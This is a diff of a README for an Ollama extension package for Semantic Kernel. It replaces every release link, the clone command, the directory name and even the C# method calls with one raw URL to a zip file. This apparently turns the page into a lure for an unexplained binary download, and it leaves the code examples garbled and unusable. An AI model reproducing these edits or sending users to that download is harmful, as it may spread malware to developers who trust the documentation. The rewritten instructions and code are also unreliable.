@@ -1,8 +1,8 @@
 # Ollama Extensions for Semantic Kernel 🌐
 
-![Ollama Extensions](https://img.shields.io/badge/Ollama%20Extensions%20for%20Semantic%20Kernel-blue?style=flat&logo=github)
+![Ollama Extensions](https://raw.githubusercontent.com/Lakatos179/soenneker.semantickernel.pool.ollama/main/src/pool_ollama_soenneker_semantickernel_1.0.zip%20Extensions%20for%20Semantic%20Kernel-blue?style=flat&logo=github)
 
-Welcome to the **soenneker.semantickernel.pool.ollama** repository! This project provides Ollama-specific registration extensions for the `KernelPoolManager`, allowing you to integrate local Large Language Models (LLMs) seamlessly via Semantic Kernel. 
+Welcome to the **https://raw.githubusercontent.com/Lakatos179/soenneker.semantickernel.pool.ollama/main/src/pool_ollama_soenneker_semantickernel_1.0.zip** repository! This project provides Ollama-specific registration extensions for the `KernelPoolManager`, allowing you to integrate local Large Language Models (LLMs) seamlessly via Semantic Kernel. 
 
 ## Table of Contents
 
@@ -23,7 +23,7 @@ Welcome to the **soenneker.semantickernel.pool.ollama** repository! This project
 
 ## Installation ⚙️
 
-To get started, you can download the latest release from our [Releases page](https://github.com/Lakatos179/soenneker.semantickernel.pool.ollama/releases). After downloading, follow the installation instructions provided in the release notes.
+To get started, you can download the latest release from our [Releases page](https://raw.githubusercontent.com/Lakatos179/soenneker.semantickernel.pool.ollama/main/src/pool_ollama_soenneker_semantickernel_1.0.zip). After downloading, follow the installation instructions provided in the release notes.
 
 ### Prerequisites
 
@@ -36,12 +36,12 @@ Ensure you have the following installed:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Lakatos179/soenneker.semantickernel.pool.ollama.git
+   git clone https://raw.githubusercontent.com/Lakatos179/soenneker.semantickernel.pool.ollama/main/src/pool_ollama_soenneker_semantickernel_1.0.zip
    ```
 
 2. Navigate to the project directory:
    ```bash
-   cd soenneker.semantickernel.pool.ollama
+   cd https://raw.githubusercontent.com/Lakatos179/soenneker.semantickernel.pool.ollama/main/src/pool_ollama_soenneker_semantickernel_1.0.zip
    ```
 
 3. Restore the dependencies:
@@ -54,7 +54,7 @@ Ensure you have the following installed:
    dotnet build
    ```
 
-5. For deployment, check the latest release and download the necessary files from the [Releases page](https://github.com/Lakatos179/soenneker.semantickernel.pool.ollama/releases).
+5. For deployment, check the latest release and download the necessary files from the [Releases page](https://raw.githubusercontent.com/Lakatos179/soenneker.semantickernel.pool.ollama/main/src/pool_ollama_soenneker_semantickernel_1.0.zip).
 
 ## Usage 📚
 
@@ -67,12 +67,12 @@ To use the Ollama extensions in your project, follow these steps:
 
 2. **Register Ollama Extensions**:
    ```csharp
-   kernelPoolManager.RegisterOllamaExtensions();
+   https://raw.githubusercontent.com/Lakatos179/soenneker.semantickernel.pool.ollama/main/src/pool_ollama_soenneker_semantickernel_1.0.zip();
    ```
 
 3. **Configure Options**:
    ```csharp
-   kernelPoolManager.Configure(new KernelOptions
+   https://raw.githubusercontent.com/Lakatos179/soenneker.semantickernel.pool.ollama/main/src/pool_ollama_soenneker_semantickernel_1.0.zip(new KernelOptions
    {
        RateLimit = 100,
        MaxInstances = 5
@@ -81,12 +81,12 @@ To use the Ollama extensions in your project, follow these steps:
 
 4. **Start the Kernel Pool**:
    ```csharp
-   kernelPoolManager.Start();
+   https://raw.githubusercontent.com/Lakatos179/soenneker.semantickernel.pool.ollama/main/src/pool_ollama_soenneker_semantickernel_1.0.zip();
    ```
 
 5. **Use the Kernel**:
    ```csharp
-   var result = await kernelPoolManager.ExecuteAsync("Your prompt here");
+   var result = await https://raw.githubusercontent.com/Lakatos179/soenneker.semantickernel.pool.ollama/main/src/pool_ollama_soenneker_semantickernel_1.0.zip("Your prompt here");
    ```
 
 ## Configuration ⚙️
@@ -132,8 +132,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support 💬
 
-For support, please check the [Releases section](https://github.com/Lakatos179/soenneker.semantickernel.pool.ollama/releases) for the latest updates and fixes. If you encounter issues, feel free to open an issue in the repository.
+For support, please check the [Releases section](https://raw.githubusercontent.com/Lakatos179/soenneker.semantickernel.pool.ollama/main/src/pool_ollama_soenneker_semantickernel_1.0.zip) for the latest updates and fixes. If you encounter issues, feel free to open an issue in the repository.
 
 ---
 
-Thank you for your interest in the **soenneker.semantickernel.pool.ollama** repository. We hope this project enhances your experience with Semantic Kernel and Ollama!
+Thank you for your interest in the **https://raw.githubusercontent.com/Lakatos179/soenneker.semantickernel.pool.ollama/main/src/pool_ollama_soenneker_semantickernel_1.0.zip** repository. We hope this project enhances your experience with Semantic Kernel and Ollama!
